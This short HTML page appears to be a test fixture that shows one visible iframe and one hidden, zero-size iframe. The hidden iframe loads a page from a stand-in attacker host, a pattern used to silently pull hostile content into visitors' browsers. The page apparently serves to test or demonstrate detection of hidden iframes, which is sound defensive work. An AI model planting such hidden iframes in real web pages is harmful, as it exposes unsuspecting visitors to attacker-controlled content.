<!DOCTYPE html>
<html>
<head>
    <title>Iframe Page</title>
</head>
<body>
    <h1>Page with Hidden and Visible Iframes</h1>
    <!-- Visible iframe -->
    <iframe src="https://example.com/visible" width="600" height="400"></iframe>
    
    <!-- Hidden iframe -->
    <iframe src="https://attacker.com/hidden" width="0" height="0" style="display:none;"></iframe>
</body>
</html>
